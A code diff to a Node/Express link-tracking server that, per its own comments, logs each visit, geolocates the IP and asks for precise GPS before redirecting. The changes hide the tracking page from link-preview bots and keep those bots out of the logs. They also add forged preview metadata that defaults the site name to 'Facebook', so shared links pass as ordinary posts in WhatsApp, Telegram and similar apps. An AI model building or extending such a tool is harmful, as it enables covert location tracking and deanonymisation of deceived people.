@@ -116,16 +116,24 @@ async function lookupGeo(ip) {
 
 // --- API: links -------------------------------------------------------------
 app.post('/api/links', (req, res) => {
-  const { title, url } = req.body || {};
+  const { title, url, description, image_url, site_name } = req.body || {};
   const cleanTitle = String(title || '').trim();
   const cleanUrl = normalizeUrl(url);
+  const cleanDesc = String(description || '').trim().slice(0, 500) || null;
+  const cleanImage = image_url ? normalizeUrl(image_url) : null;
+  const cleanSite = String(site_name || '').trim() || 'Facebook';
   if (!cleanTitle) return res.status(400).json({ error: 'Title is required' });
   if (!cleanUrl) return res.status(400).json({ error: 'URL is required' });
   try { new URL(cleanUrl); } catch { return res.status(400).json({ error: 'Invalid URL' }); }
+  if (cleanImage) { try { new URL(cleanImage); } catch { return res.status(400).json({ error: 'Invalid image URL' }); } }
 
   const id = makeId(8);
   const now = Date.now();
-  const link = { id, title: cleanTitle, target_url: cleanUrl, created_at: now };
+  const link = {
+    id, title: cleanTitle, target_url: cleanUrl,
+    description: cleanDesc, image_url: cleanImage, site_name: cleanSite,
+    created_at: now,
+  };
   store.links.unshift(link);
   save();
 
@@ -193,6 +201,36 @@ app.post('/api/visits/:visitId/location', (req, res) => {
   res.json({ ok: true });
 });
 
+function isLinkPreviewBot(ua) {
+  return /facebookexternalhit|facebookcatalog|WhatsApp|TelegramBot|Twitterbot|LinkedInBot|Slackbot|Discordbot|SkypeUriPreview|vkShare|Embedly|Pinterest|redditbot|Applebot|Googlebot|Bingbot/i.test(ua || '');
+}
+
+function escapeHtml(s) {
+  return String(s ?? '').replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
+}
+
+function ogMetaTags(link, pageUrl) {
+  const img = link.image_url || '';
+  const desc = link.description || '';
+  const site = link.site_name || 'Facebook';
+  return `
+<meta property="og:type" content="article" />
+<meta property="og:site_name" content="${escapeHtml(site)}" />
+<meta property="og:title" content="${escapeHtml(link.title)}" />
+${desc ? `<meta property="og:description" content="${escapeHtml(desc)}" />` : ''}
+<meta property="og:url" content="${escapeHtml(pageUrl)}" />
+${img ? `<meta property="og:image" content="${escapeHtml(img)}" />
+<meta property="og:image:secure_url" content="${escapeHtml(img)}" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:image:alt" content="${escapeHtml(link.title)}" />` : ''}
+<meta name="twitter:card" content="${img ? 'summary_large_image' : 'summary'}" />
+<meta name="twitter:title" content="${escapeHtml(link.title)}" />
+${desc ? `<meta name="twitter:description" content="${escapeHtml(desc)}" />` : ''}
+${img ? `<meta name="twitter:image" content="${escapeHtml(img)}" />` : ''}
+${desc ? `<meta name="description" content="${escapeHtml(desc)}" />` : ''}`;
+}
+
 // --- /r/:id: log the visit, ask for precise GPS, then redirect -------------
 app.get('/r/:id', async (req, res) => {
   const { id } = req.params;
@@ -200,6 +238,22 @@ app.get('/r/:id', async (req, res) => {
   if (!link) return res.status(404).send('Link not found');
 
   const ua = req.get('user-agent') || '';
+  const pageUrl = `${req.protocol}://${req.get('host')}/r/${id}`;
+
+  // Link-preview scrapers (WhatsApp/FB/Telegram/...) just need OG tags — don't log them.
+  if (isLinkPreviewBot(ua)) {
+    res.set('Cache-Control', 'public, max-age=300');
+    return res.send(`<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<title>${escapeHtml(link.title)}</title>
+${ogMetaTags(link, pageUrl)}
+</head>
+<body><p>${escapeHtml(link.title)}</p></body>
+</html>`);
+  }
+
   const parsed = new UAParser(ua).getResult();
   const deviceType = parsed.device.type
     || (/mobile/i.test(ua) ? 'mobile' : 'desktop');
@@ -229,14 +283,14 @@ app.get('/r/:id', async (req, res) => {
   save();
 
   const target = link.target_url;
-  const safeTitle = String(link.title).replace(/</g, '&lt;');
   res.set('Cache-Control', 'no-store');
   res.send(`<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>${safeTitle}</title>
+<title>${escapeHtml(link.title)}</title>
+${ogMetaTags(link, pageUrl)}
 <style>
   html,body{margin:0;height:100%;background:#0f172a;color:#e2e8f0;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
   .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
